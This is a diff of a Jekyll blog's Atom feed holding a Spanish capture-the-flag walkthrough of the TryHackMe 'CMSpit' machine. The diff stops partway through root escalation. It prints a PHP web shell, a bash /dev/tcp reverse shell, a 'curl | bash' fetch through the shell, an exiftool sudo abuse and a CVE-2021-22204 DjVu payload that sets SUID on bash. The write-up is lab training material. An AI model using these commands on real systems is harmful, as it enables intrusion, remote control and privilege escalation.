@@ -1,4 +1,294 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-03-05T17:06:08-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">B0ySie7e</title><subtitle>Posts about security, CTFs and networking</subtitle><author><name>B0Y-SIE7E</name></author><entry><title type="html">Vulnerabilidades Web</title><link href="http://localhost:4000/Vulnerabilidades-web/" rel="alternate" type="text/html" title="Vulnerabilidades Web" /><published>2022-02-26T00:00:00-05:00</published><updated>2022-02-26T00:00:00-05:00</updated><id>http://localhost:4000/Vulnerabilidades-web</id><content type="html" xml:base="http://localhost:4000/Vulnerabilidades-web/">&lt;p&gt;Conceptos básicos y a grandes rasgos de las vulnerabilidades asi como recursos de como explotarlas cada uno de estas&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-03-19T20:41:23-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">b0ySie7e.github.io</title><subtitle>Posts about security, CTFs and networking</subtitle><author><name>B0Y-SIE7E</name></author><entry><title type="html">CMSpit- Tryhackme</title><link href="http://localhost:4000/CMSpit/" rel="alternate" type="text/html" title="CMSpit- Tryhackme" /><published>2022-03-19T00:00:00-04:00</published><updated>2022-03-19T00:00:00-04:00</updated><id>http://localhost:4000/CMSpit</id><content type="html" xml:base="http://localhost:4000/CMSpit/">&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;NOMBRE&lt;/th&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;Plataforma&lt;/th&gt;
+      &lt;th style=&quot;text-align: right&quot;&gt;OS&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;CMSpit&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;TRYHACKME&lt;/td&gt;
+      &lt;td style=&quot;text-align: right&quot;&gt;LINUX&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;escaneo-de-puertos&quot;&gt;ESCANEO DE PUERTOS&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Realizamos un escaneo de puertos con la herramienta nmap, en esta caso lo podemos realizar con muchas otras pero yo la realizaré con nmap&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;kali㉿Hacknet&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/…/tryhackme/maquinas/CMSpit/recognition]
+  Sie7e&amp;gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.207.156  
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;-p-&lt;/strong&gt; : Es el rango de puertos las cuales va escanear.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;–open&lt;/strong&gt; : Solo nos reportará los puertos que tienen status “open”.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;–min-rate&lt;/strong&gt; : Indica la tasa minima de paquetes, esto acelerará el escaneo. Esto puede tener muchas deficiencias cuando la condición de la red es muy mala y en ese caso es mejor realizar un &lt;strong&gt;T4&lt;/strong&gt; o &lt;strong&gt;T5&lt;/strong&gt;.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;-vvv&lt;/strong&gt; : Con este parametro podemos ver la output mientras va escaneando y asi adelantar un poco mas de trabajo.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;-n&lt;/strong&gt; : Parametro que indica que no deseamos que realiza host discovery, con esto activo puede demorar un poco mas el escaneo.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;may be slower.
+  Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-03-19 12:30 EDT
+  Initiating Connect Scan at 12:30
+  Scanning 10.10.207.156 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
+  Discovered open port 80/tcp on 10.10.207.156
+  Discovered open port 22/tcp on 10.10.207.156
+  Completed Connect Scan at 12:31, 27.68s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.207.156
+  Host is up, received user-set &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.21s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+  Scanned at 2022-03-19 12:30:46 EDT &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;28s
+  Not shown: 63620 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 1913 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;conn-refused&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  Some closed ports may be reported as filtered due to &lt;span class=&quot;nt&quot;&gt;--defeat-rst-ratelimit&lt;/span&gt;
+  PORT   STATE SERVICE REASON
+  22/tcp open  ssh     syn-ack
+  80/tcp open  http    syn-ack
+
+  Read data files from: /usr/bin/../share/nmap
+  Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;27.74 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;NMAP nos reporta dos puertos el 22 y 80, entonces con nmap vamos a escanear los servicios y versiones que se estan ejecutando en estos puertos.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;kali㉿Hacknet&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/…/tryhackme/maquinas/CMSpit/recognition]
+  Sie7e&amp;gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,80 &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-vv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; servicesScan.nmap 10.10.207.156
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;-p22,80&lt;/strong&gt;  : Puertos en espacificos que deseamos escanear.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;-sC&lt;/strong&gt; : Scripts por defecto que se usaran para la enumeración.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;-sV&lt;/strong&gt; :Enumerar las versiones y servicios&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;-sCV&lt;/strong&gt; : Otra manera de indicar &lt;strong&gt;-sC&lt;/strong&gt; y &lt;strong&gt;-sV&lt;/strong&gt; de manera junta.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;-oN&lt;/strong&gt; : Para que nos guarde la información enumerada en formato nmap.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;c&quot;&gt;# Nmap 7.92 scan initiated Fri Mar 18 13:40:54 2022 as: nmap -p22,80 -sCV -vv -Pn -oN servicesScan.nmap 10.10.207.156&lt;/span&gt;
+  Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.207.156
+  Host is up, received user-set &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.22s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+  Scanned at 2022-03-18 13:40:55 EDT &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;22s
+
+  PORT   STATE SERVICE REASON  VERSION
+  22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  | ssh-hostkey: 
+  |   2048 7f:25:f9:40:23:25:cd:29:8b:28:a9:d9:82:f5:49:e4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD7acH8krj6oVh6s+R3VYnJ/Xc8o5b43RcrRwiMPKe7V8V/SLfeVeHtE06j0PnfF5bHbNjtLP8pMq2USPivt/LcsS+8e+F5yfFFAVawOWqtd9tnrXVQhmyLZVb+wzmjKe+BaNWSnEazjIevMjD3bR8YBYKnf2BoaFKxGkJKPyleMT1GAkU+r47m2FsMa+l7p79VIYrZfss3NTlRq9k6pGsshiJnnzpWmT1KDjI90fGT6oIkALZdW/++qXi+px6+bWDMiW9NVv0eQmN9eTwsFNoWE3JDG7Aeq7hacqF7JyoMPegQwAAHI/ZD66f4zQzqQN6Ou6+sr7IMkC62rLMjKkXN
+  |   256 0a:f4:29:ed:55:43:19:e7:73:a7:09:79:30:a8:49:1b &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEnbbSTSHNXi6AcEtMnOG+srCrE2U4lbRXkBxlQMk1damlhG+U0tmiObRCoasyBY2kvAdU/b7ZWoE0AmoYUldvk&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+  |   256 2f:43:ad:a3:d1:5b:64:86:33:07:5d:94:f9:dc:a4:01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKYUS/4ObKPMEyPGlgqg6khm41SWn61X9kGbNvyBJh7e
+  80/tcp open  http    syn-ack Apache httpd 2.4.18 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+  |_http-server-header: Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  |_http-trane-info: Problem with XML parsing of /evox/about
+  | http-methods: 
+  |_  Supported Methods: GET HEAD POST OPTIONS
+  | http-title: Authenticate Please!
+  |_Requested resource was /auth/login?to&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/
+  |_http-favicon: Unknown favicon MD5: C9CD46C6A2F5C65855276A03FE703735
+  Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+
+  Read data files from: /usr/bin/../share/nmap
+  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+  &lt;span class=&quot;c&quot;&gt;# Nmap done at Fri Mar 18 13:41:17 2022 -- 1 IP address (1 host up) scanned in 23.06 seconds&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;sitio-web&quot;&gt;SITIO WEB&lt;/h2&gt;
+&lt;p&gt;Se encuentra un sitio web con un login, de la cual no tenemos credenciales.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/CMSpit/webLogin.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Enumerando un poco no topamos un directorio que nos muestra la versión&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/CMSpit/version.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Teniendo la versión, buscamos un exploit y nos topamos con uno. Este permite enumerar usuarios y cambiar la contraseña.&lt;/p&gt;
+
+&lt;h2 id=&quot;cve-2020-35847---cve-2020-35848&quot;&gt;CVE-2020-35847 - CVE-2020-35848&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/CMSpit/search_exploit.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nos lo traemos a nuestro direcorio de trabajo y ejecutamos. Enumeramos los usuarios existentes:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;admin&lt;/li&gt;
+  &lt;li&gt;darkStart7471&lt;/li&gt;
+  &lt;li&gt;skidy&lt;/li&gt;
+  &lt;li&gt;ekoparty&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;De los cuales podemos cambiar las contraseñas. En caso nuestro cambiaremos la contraseña del usuario admin.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/CMSpit/exploit_exec.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;web-shell&quot;&gt;WEB SHELL&lt;/h2&gt;
+&lt;p&gt;Estando logueados podemos enumerar el CMS para realizar ejecución de comandos dentro del sistema. En este apartado vemos un campo en el cual podemos subir un archivo.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/CMSpit/upload_file.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos un boton para poder subir un archivo&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/CMSpit/upload_file02.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vamos a subir una &lt;a href=&quot;https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/&quot;&gt;web shell&lt;/a&gt; en php.&lt;/p&gt;
+
+&lt;p&gt;shell.php&lt;/p&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; 
+   &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'cmd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]));&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Este archivo en php(web shell) nos permitira ejecutar comandos en el sistema victima.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/CMSpit/upload_file03.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ya tenemos la shell.php subida.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/CMSpit/shell.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Necesitamos la ruta de donde se almacenó nuestro shell.php y para eso nos vamos al apartado siguiente&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/CMSpit/shell02.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si le pasamos el comando &lt;strong&gt;ls -la&lt;/strong&gt;, vemos que los lista los archivos existentes dentro del sistema víctima&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/CMSpit/shell03.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;ganar-acceso-a-la-máquina&quot;&gt;GANAR ACCESO A LA MÁQUINA&lt;/h2&gt;
+
+&lt;p&gt;Para obtener el acceso a la maquína, vamos a crearnos un archivo index.html que contendra lo siguiente.&lt;/p&gt;
+
+&lt;p&gt;index.html&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash -i &amp;gt;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt; /dev/tcp/YOU-IP/443 0&amp;gt;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Esto se puede realizar de muchas maneras ya que tenemos ejecución de comandos a nivel del sistema víctima.&lt;/p&gt;
+
+&lt;p&gt;Luego iniciamos un servidor en python indicandole el puerto en donde va ejecutarse.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;python3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;server&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Y ponernos a la escucha en el puerto 443 para ganar acceso a la máquina, ya que en el archivo index.html le indicamos que a ese puerto nos enviará una shell.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ncat &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 443
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/CMSpit/shell04.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;En la url ponemos lo siguiente:&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://10.10.207.156/storage/uploads/2022/03/19/62360bf9715d0shell.php?cmd=curl http://IP | bash 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Realizamos un curl a nuestro servidor que esta con python y lo vamos a interpretar con bash, esto noes permite entablarnos un shell a nivel de terminal&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/CMSpit/shell05.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Una vez ganado acceso, realizamos un tratamiento de la tty, para tener un mejor manejo de la consola y que esta sea iteractiva&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;script /dev/null &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; bash
+^Z
+&lt;span class=&quot;nb&quot;&gt;stty &lt;/span&gt;raw &lt;span class=&quot;nt&quot;&gt;-echo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;fg
+&lt;/span&gt;reset xterm
+
+&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;TERM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;xterm
+&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;SHELL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/bin/bash 
+
+&lt;span class=&quot;nb&quot;&gt;stty &lt;/span&gt;rows &amp;lt;your rows terminal&amp;gt; columns &amp;lt;your columns terminal&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;user-www-data&quot;&gt;USER WWW-DATA&lt;/h2&gt;
+
+&lt;p&gt;Enumerando los directorios, en /home/stux encontramos un archivo &lt;strong&gt;.dbshell&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/CMSpit/dbshell.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;En este archivo encontramos credenciales del usuario &lt;strong&gt;stux&lt;/strong&gt; que usa en una base de datos. Entonces podemos probar si se reutilizan las credenciales&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/CMSpit/dbshell02.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Desde luego se estan reutilizando las credenciales&lt;/p&gt;
+
+&lt;h2 id=&quot;user-stux&quot;&gt;USER STUX&lt;/h2&gt;
+&lt;p&gt;Teniendo las credenciales vamos a enumerar los privilegios que tiene este usuario&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/CMSpit/stux01.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si nos vamos a &lt;a href=&quot;https://gtfobins.github.io/gtfobins/exiftool/#sudo&quot;&gt;gtfobins&lt;/a&gt;, vemos una manera de obtener los archivos. Haciendo uso del siguiente comando&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;exiftool &lt;span class=&quot;nt&quot;&gt;-filename&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tmp/root.txt /root/root.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Ya tenemos nuestra flag, pero lo que queremos es ganar privilegios de usuario root&lt;/p&gt;
+
+&lt;h2 id=&quot;cve-2021-22204-exiftool&quot;&gt;CVE-2021-22204-exiftool&lt;/h2&gt;
+
+&lt;p&gt;Buscando en la web y damos con un blog en la que explica la vulnerabilidad y como podemos ejecutar comandos de manera manual.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;BLOG&lt;/strong&gt; : &lt;a href=&quot;https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/&quot;&gt;cve-2021-22204-exiftool-rce&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/CMSpit/stux02.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Exploit&lt;/strong&gt; que podemos usar para generar de manera automatizada nuestra imagen con el payload indicado.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/CMSpit/stux03.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vamos a instalar la djvulibre-bin&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;kali㉿Hacknet&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/…/tryhackme/maquinas/CMSpit/exploit]
+Sie7e&amp;gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;djvulibre-bin
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Tambien necesitaremos un imagen  y nuestro payload que queremos que ejecute root.&lt;/p&gt;
+
+&lt;p&gt;Payload, contendra lo siguiente:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;metadata &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'chmod +s /bin/bash'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Con esto vamos a la /bin/bash para que sea SUID y con bash -p podamos ser usuario root.&lt;/p&gt;
+
+&lt;p&gt;Ejecutamos bzz:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;kali㉿Hacknet&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/…/tryhackme/maquinas/CMSpit/exploit]
+Sie7e&amp;gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;bzz payload payload.bzz
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Creamos un exxploit.djvu:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;kali㉿Hacknet&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/…/tryhackme/maquinas/CMSpit/exploit]
+Sie7e&amp;gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;djvumake exploit.djvu &lt;span class=&quot;nv&quot;&gt;INFO&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'1,1'&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;BGjp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/dev/null &lt;span class=&quot;nv&quot;&gt;ANTz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;payload.bzz
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
